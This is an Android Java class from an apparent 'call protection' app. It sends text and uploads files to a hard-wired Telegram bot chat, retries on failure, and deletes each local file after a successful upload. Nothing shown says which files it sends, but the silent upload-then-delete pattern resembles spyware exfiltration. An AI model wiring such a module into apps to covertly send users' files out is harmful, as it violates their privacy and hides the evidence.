package com.daria.callprotection;

import android.content.Context;
import android.net.ConnectivityManager;
import android.util.Log;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.*;

public class TelegramUploader {
    private static final String TAG = "TelegramUploader";

    // NOTE: Config.BOT_TOKEN / Config.CHAT_ID should be present in project per your choice
    private static final String BOT_TOKEN = Config.BOT_TOKEN;
    private static final String CHAT_ID = Config.CHAT_ID;
    private static final String API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private static final ExecutorService EXEC = Executors.newFixedThreadPool(2);
    private static final int MAX_RETRIES = 3;
    private static final long RETRY_BASE_MS = 1000;

    public interface Callback { void onComplete(boolean success, String info); }

    /* Public async API */
    public static void sendTextAsync(final String text, final Callback cb) {
        EXEC.submit(() -> {
            boolean ok = sendMessageSync(text);
            if (!ok) handleError("sendTextAsync", text, null);
            if (cb != null) cb.onComplete(ok, ok ? "OK" : "FAILED");
        });
    }

    public static void uploadFileAsync(final File file, final String caption, final Callback cb) {
        EXEC.submit(() -> {
            boolean ok = sendFileWithRetrySync(file, caption);
            if (!ok) handleError("uploadFileAsync", file != null ? file.getName() : "null", null);
            if (cb != null) cb.onComplete(ok, ok ? "OK" : "FAILED");
        });
    }

    /* Backwards compatible shortcuts used in project */
    public static void sendText(final String text) { sendTextAsync(text, null); }
    public static void uploadFile(final Context ctx, final File file, final String caption) { uploadFileAsync(file, caption, null); }

    /* Internal sync helpers */
    private static boolean sendMessageSync(String text) {
        if (!isNetworkAvailable()) { FileLogger.log("[TG] sendMessage: no network"); return false; }
        try {
            String urlStr = API_BASE + "sendMessage";
            String payload = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                    + "&text=" + URLEncoder.encode(text, "UTF-8").replace("+", "%20");
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("POST"); conn.setDoOutput(true);
            byte[] bytes = payload.getBytes(StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(bytes.length);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            try (OutputStream os = conn.getOutputStream()) { os.write(bytes); os.flush(); }
            int code = conn.getResponseCode();
            String resp = readStream(code >= 400 ? conn.getErrorStream() : conn.getInputStream());
            FileLogger.log("[TG] sendMessage code=" + code + " resp=" + resp);
            conn.disconnect();
            return code == HttpURLConnection.HTTP_OK;
        } catch (Exception e) { handleError("sendMessageSync", text, e); return false; }
    }

    private static boolean sendFileWithRetrySync(File file, String caption) {
        for (int attempt = 1; attempt <= MAX_RETRIES; attempt++) {
            boolean ok = sendMultipartFileSync(file, caption);
            if (ok) return true;
            try { Thread.sleep(RETRY_BASE_MS * attempt); } catch (InterruptedException ignored) {}
        }
        return false;
    }

    private static boolean sendMultipartFileSync(File file, String caption) {
        if (file == null || !file.exists()) { FileLogger.log("[TG] sendMultipartFile: file missing: " + (file==null?"null":file.getAbsolutePath())); return false; }
        if (!isNetworkAvailable()) { FileLogger.log("[TG] sendMultipartFile: no network for " + file.getName()); return false; }
        String boundary = "----CallProtection" + System.currentTimeMillis();
        try {
            String urlStr = API_BASE + "sendDocument?chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true); conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (OutputStream os = conn.getOutputStream();
                 DataOutputStream dos = new DataOutputStream(os);
                 FileInputStream fis = new FileInputStream(file)) {

                if (caption != null) {
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    dos.writeBytes(caption + "\r\n");
                }

                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                byte[] buf = new byte[4096];
                int read;
                while ((read = fis.read(buf)) != -1) dos.write(buf, 0, read);
                dos.writeBytes("\r\n");
                dos.writeBytes("--" + boundary + "--\r\n");
                dos.flush();
            }

            int code = conn.getResponseCode();
            String resp = readStream(code >= 400 ? conn.getErrorStream() : conn.getInputStream());
            FileLogger.log("[TG] sendMultipartFile code=" + code + " resp=" + resp);

            boolean ok = code == HttpURLConnection.HTTP_OK;
            if (ok) {
                try { boolean deleted = file.delete(); FileLogger.log("[TG] deleted file=" + file.getName() + " ok=" + deleted); } catch (Exception e) { FileLogger.log("[TG] delete failed: " + e.getMessage()); }
            }
            conn.disconnect();
            return ok;
        } catch (Exception e) { handleError("sendMultipartFileSync", file.getName(), e); return false; }
    }

    /* Centralized error handling */
    private static void handleError(String op, String subject, Exception e) {
        if (e != null) {
            FileLogger.log("[TG][ERR] op=" + op + " subject=" + subject + " ex=" + e.getClass().getSimpleName() + ": " + e.getMessage());
            Log.e(TAG, "TG error op=" + op + " subject=" + subject, e);
        } else {
            FileLogger.log("[TG][ERR] op=" + op + " subject=" + subject + " failed without exception");
            Log.e(TAG, "TG error op=" + op + " subject=" + subject);
        }
    }

    private static boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) App.getContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
            return ni != null && ni.isConnected();
        } catch (Exception e) {
            FileLogger.log("[TG] network check failed: " + e.getMessage());
            return false;
        }
    }

    private static String readStream(InputStream in) {
        if (in == null) return "";
        try (BufferedReader br = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
            StringBuilder sb = new StringBuilder(); String ln;
            while ((ln = br.readLine()) != null) sb.append(ln);
            return sb.toString();
        } catch (IOException e) { return ""; }
    }

    public static void shutdown() { EXEC.shutdown(); }
}
                                                                                             
